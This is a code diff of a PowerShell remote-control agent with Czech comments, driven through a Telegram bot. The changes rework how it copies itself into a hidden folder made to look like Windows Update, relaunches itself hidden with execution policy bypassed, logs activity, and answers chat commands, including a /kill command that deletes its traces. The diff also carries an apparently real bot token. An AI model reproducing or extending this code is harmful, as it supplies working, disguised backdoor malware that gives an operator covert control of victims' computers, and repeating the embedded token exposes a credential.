@@ -4,7 +4,7 @@
 
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
 
-# SKRYTÁ SLOŽKA - vypadá jako Windows Update
+# SKRYTÁ SLOŽKA
 $targetFolder = "$env:LOCALAPPDATA\Microsoft\WindowsUpdate"
 $targetScript = "$targetFolder\WuUpdate.ps1"
 $stateFile = "$targetFolder\.state"
@@ -12,59 +12,49 @@ $logFile = "$targetFolder\.log"
 
 $chatId = $null
 
-# FUNKCE: Vytvoř skrytou složku a zkopíruj se tam
-function Install-Agent {
-    try {
-        # Vytvoř složku pokud neexistuje
+# INSTALACE - pokud neběžíme z cílové složky
+try {
+    $currentPath = if($PSCommandPath) { $PSCommandPath } else { $null }
+    
+    if($currentPath -and $currentPath -ne $targetScript) {
+        # Vytvoř složku
         if(!(Test-Path $targetFolder)) {
             New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
-            Write-Host "Slozka vytvorena: $targetFolder"
         }
         
-        # Nastav Hidden atribut
-        $folder = Get-Item $targetFolder -Force
-        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
+        # Nastav Hidden
+        try {
+            $folder = Get-Item $targetFolder -Force
+            $folder.Attributes = 'Hidden'
+        } catch {}
         
-        # Zkontroluj jestli už agent není nainstalovaný
-        $currentPath = $MyInvocation.PSCommandPath
+        # Zkopíruj se
+        Copy-Item -Path $currentPath -Destination $targetScript -Force -ErrorAction Stop
         
-        if($currentPath -ne $targetScript) {
-            Write-Host "Kopiruji agenta do: $targetScript"
-            
-            # Zkopíruj celý tento skript do cílové složky
-            Copy-Item -Path $PSCommandPath -Destination $targetScript -Force
-            
-            # Spusť kopii
-            Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$targetScript`""
-            
-            Write-Host "Agent nainstalovany, spoustim kopii..."
-            exit
-        } else {
-            Write-Host "Agent uz bezi z cilove slozky: $targetScript"
-        }
+        # Spusť kopii
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$targetScript`""
         
-    } catch {
-        Write-Host "ERROR pri instalaci: $_"
-        # Pokud selže, pokračuj z aktuálního místa
+        # Ukonči se
+        exit
     }
+} catch {
+    # Pokud instalace selže, pokračuj z aktuálního místa
+    Write-Host "Instalace selhala, pokracuji z aktualniho mista: $_"
 }
 
-# Pokud agent neběží z cílové složky, nainstaluj ho
-if($PSCommandPath -ne $targetScript) {
-    Install-Agent
-}
-
-# TEPRVE TEĎ spusť normální funkce agenta
+# FUNKCE AGENTA
 
 function Write-Log($msg) {
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "$timestamp - $msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
+    try {
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        "$timestamp - $msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
+    } catch {}
     Write-Host $msg
 }
 
 Write-Log "=== AGENT START ==="
 
-# Načti uložený stav (pokud existuje)
+# Načti stav
 if(Test-Path $stateFile) {
     try {
         $savedState = Get-Content $stateFile -Raw -Encoding UTF8 | ConvertFrom-Json
@@ -192,22 +182,21 @@ while($true) {
                     Send-Message "Log soubor neexistuje"
                 }
             } elseif($cmd -eq '/files') {
+                $currentLoc = if($PSCommandPath) { $PSCommandPath } else { "neznama (spusteno z pameti)" }
                 $info = "Umisteni souboru:`n"
-                $info += "Agent: $targetScript`n"
+                $info += "Aktualni lokace: $currentLoc`n"
+                $info += "Cilova lokace: $targetScript`n"
                 $info += "State: $stateFile`n"
                 $info += "Log: $logFile`n`n"
-                $info += "Slozka: $targetFolder (Hidden)"
+                $info += "Slozka: $targetFolder"
                 Send-Message $info
             } elseif($cmd -eq '/kill') {
                 Write-Log "Ukoncuji se..."
                 Send-Message "Agent se ukoncuje..."
                 
-                # Smaž všechny soubory
                 Remove-Item $targetScript -Force -ErrorAction SilentlyContinue
                 Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                 Remove-Item $logFile -Force -ErrorAction SilentlyContinue
-                
-                # Pokus se smazat složku (pokud je prázdná)
                 Remove-Item $targetFolder -Force -ErrorAction SilentlyContinue
                 
                 exit
